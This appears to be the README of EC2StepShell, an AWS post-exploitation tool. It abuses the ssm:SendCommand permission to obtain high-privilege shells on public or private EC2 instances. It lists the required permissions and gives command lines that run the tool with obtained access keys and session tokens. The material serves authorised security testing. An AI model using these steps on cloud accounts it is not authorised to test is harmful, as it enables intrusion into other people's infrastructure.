# EC2StepShell

EC2StepShell is an AWS post-exploitation tool for getting high privileges reverse shells in public or private EC2 instances.
It works by sending commands to EC2 instances using ssm:SendCommand and then retrieves the output using ssm:ListCommandInvocations or ssm:GetCommandInvocation.

More details about how the tool works can be found here: https://securitycafe.ro/2023/03/08/ec2stepshell-reverse-shells-private-ec2-instances/

## Installation

```bash
python -m pip install EC2StepShell
```

## Usage

If you target a public EC2 instance, you might be able to get a reverse shell using well known payloads. However, the tool shines for the cases when the instance is in a private network or its security groups don't allow communications with your IP.

![zoomed-short-demo-ec2stepshell](https://user-images.githubusercontent.com/38787278/219875886-05f367af-6782-4137-bd49-8e1b78652c36.gif)

```bash
python -m ec2stepshell -h
```

![help-menu](https://user-images.githubusercontent.com/38787278/218660321-cbf2da28-b9e6-4727-9643-697cf5857ce3.png)

### Requirements

- You need a programmatic access within the account (temporary/persistent access credentials)
- You need two permissions:
  - ssm:SendCommand
  - ssm:ListCommandInvocations or ssm:GetCommandInvocation

The action ssm:SendCommand must be granted over the target EC2 instance and the documents:
- AWS-RunShellScript
- AWS-RunPowerShellScript

You might not be able to verify this. In most cases of misconfigurations, ssm:SendCommand will be granted with `*`, but if you receive access denied and you're sure that the instance id is correct, then this might be the issue.

### Basic usage

```bash
# running using the default profile configured in AWS CLI
python -m ec2stepshell $instance_id --region $region

# running using a specific profile configured in AWS CLI
python -m ec2stepshell $instance_id --region $region --profile $profile

# running using persistent access credentials
python -m ec2stepshell $instance_id --region $region --access-key $access_key --secret-key $secret_key

# running using temporary access credentials
python -m ec2stepshell $instance_id --region $region --access-key $access_key --secret-key $secret_key --session-token $session_token
```

### Advanced usage

#### OS

The OS is detected automatically, however, if you encounter issues, especially for Windows instances, manually specify it with `--os` 

```bash
# for MacOS and UNIX instances
python -m ec2stepshell $instance_id --region $region --os linux 

# for Windows instances
python -m ec2stepshell $instance_id --region $region --os windows 
```

#### Delay

There is an initial wait time configured before attempting to retrieve the output. Its default value is 0.7 seconds, but for Windows and low resources instances this might not be enough.

The value can be increased with `--delay`. For Windows instances, my recommendation is to go for a 3 seconds delay.

```bash
# set an initial delay of 2.5 seconds
python -m ec2stepshell $instance_id --region $region --delay 2.5
```

#### Retry delay

After the initial wait time passed, the tool will try to retrieve the command's output.
If the command still didn't finished its execution, a new retry delay will come in place as wait time.

This can be adjusted with `--retry-delay`.

The default value is 0.3 seconds.

```bash
# set retry delay of 0.5 seconds
python -m ec2stepshell $instance_id --region $region --retry-delay 0.5
```

#### Number of retries

If the command didn't finish its execution, the tool will retry for a number of times to retrieve its output.

This can be adjusted with `--max-retries`.

The default value is 3.

```bash
# increase the maximum number of retries to 5
python -m ec2stepshell $instance_id --region $region --max-retries 5
```

#### In-shell commands

Once the shell is established, you get access to a new set of commands. You can view them by typing `!help`.

![in-shell-help](https://user-images.githubusercontent.com/38787278/218667636-b258e72a-5ada-4dc3-a0f4-b0941be38b19.png)

If a command didn't finish its execution in the set number of retries, then it will be put in a queue.

You can view this queue and retry manually the commands when you wish. In the meantime, the reverse shell stays open and can be used freely.

The tool will notify when a command didn't finish its execution and couldn't be retrieved. You can check the queue with not retrieved commands using `!showqueue`.

![showqueue](https://user-images.githubusercontent.com/38787278/218668801-43ce658a-82e5-4f58-a8f9-a9c91646ebbf.png)

To manually retry to retrieve the command, you can use `!retry command_id`.

![retry-command](https://user-images.githubusercontent.com/38787278/218669211-7129a49b-dffd-4ad7-9201-9a782217a6de.png)

If the retry worked, then the command will be removed from the queue. To manually clear ALL the commands in the queue, run `!clearqueue`.

If you have the command id, you can still try to retrieve them later as the command is still valid. It's just not present in the queue.
